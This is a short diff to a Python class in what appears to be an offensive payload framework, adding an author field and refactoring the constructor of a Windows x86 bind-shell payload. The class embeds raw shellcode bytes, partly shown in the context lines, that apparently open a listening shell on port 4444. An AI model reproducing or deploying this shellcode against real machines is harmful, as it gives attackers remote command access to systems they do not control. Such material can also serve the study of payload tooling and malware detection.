@@ -5,6 +5,7 @@ from core import payloadcore
 class BindWindowsx86(payloadcore.Payload):
 
     PAYLOADREF: str = "bind/windows_x86"
+    AUTHOR: str = "Danakane"
 
     def __init__(self):
         payloadbin = b"\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13" \
@@ -35,9 +36,8 @@ class BindWindowsx86(payloadcore.Payload):
                      b"\x51\x10\x60\x06\x08\x50\xe1\x9d\x8b\x8f\x5d\x60\x17" \
                      b"\xf0\xd8\x20\xb0\x96\xaf\xf4\x9d\x85\x8e\x64\x22"
 
-        super(BindWindowsx86, self).__init__(ref=BindWindowsx86.PAYLOADREF,
-                                             payloadbin=payloadbin,
-                                             optioninfo="4444")  # 4444 = bind port
+        super(BindWindowsx86, self).__init__()
+        self.customize(BindWindowsx86.AUTHOR, BindWindowsx86.PAYLOADREF, payloadbin, "4444") # 4444 = bind port
 
     def parseparameters(self, host, port):
         return self.binary()  # Nothing todo
